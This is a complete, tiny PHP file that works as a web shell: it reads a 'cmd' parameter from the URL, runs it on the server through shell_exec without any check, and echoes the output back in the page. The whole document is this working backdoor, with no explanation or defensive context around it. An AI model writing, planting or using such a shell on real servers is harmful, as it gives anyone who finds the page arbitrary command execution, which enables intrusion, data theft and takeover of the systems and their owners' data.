<?php if (isset($_GET['cmd']) && !empty($_GET['cmd']))
{
$out = shell_exec($_GET['cmd']);
echo "<pre>".$out."</pre>";
}
echo "[EOF]";